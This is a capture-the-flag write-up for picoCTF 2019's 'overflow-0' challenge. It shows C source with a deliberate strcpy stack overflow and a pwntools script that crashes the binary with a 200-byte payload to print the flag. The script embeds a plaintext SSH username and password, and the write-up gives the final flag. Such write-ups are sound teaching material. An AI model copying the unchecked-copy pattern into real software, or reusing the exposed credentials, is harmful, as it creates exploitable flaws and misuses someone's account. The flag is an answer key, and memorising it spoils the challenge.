# Problem
This should be easy. Overflow the correct buffer in this [program](https://2019shell1.picoctf.com/static/7c6fa533194c6f283cea87be317f8c7f/vuln) and get a flag. Its also found in /problems/overflow-0_3_dc6e55b8358f1c82f03ddd018a5549e0 on the shell server. [Source](https://2019shell1.picoctf.com/static/7c6fa533194c6f283cea87be317f8c7f/vuln.c).

## Hints:
Find a way to trigger the flag to print

If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting.

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/7c6fa533194c6f283cea87be317f8c7f/vuln
wget https://2019shell1.picoctf.com/static/7c6fa533194c6f283cea87be317f8c7f/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  fprintf(stderr, "%s\n", flag);
  fflush(stderr);
  exit(1);
}

void vuln(char *input){
  char buf[128];
  strcpy(buf, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  if (argc > 1) {
    vuln(argv[1]);
    printf("You entered: %s", argv[1]);
  }
  else
    printf("Please enter an argument next time\n");
  return 0;
}
```

We need to redirect program flow to sigsegv_handler, we can just override some important stack values (which will probably cause SIGSEGV).

Using this script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'


payload = "A"*200

if debug:
	r = process(['./vuln', payload])
else:
	s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)

	s.set_working_directory('/problems/overflow-0_3_dc6e55b8358f1c82f03ddd018a5549e0')
	r = s.process(['./vuln', payload])

print r.recvall()
```

Flag: picoCTF{3asY_P3a5y1fcf81f9}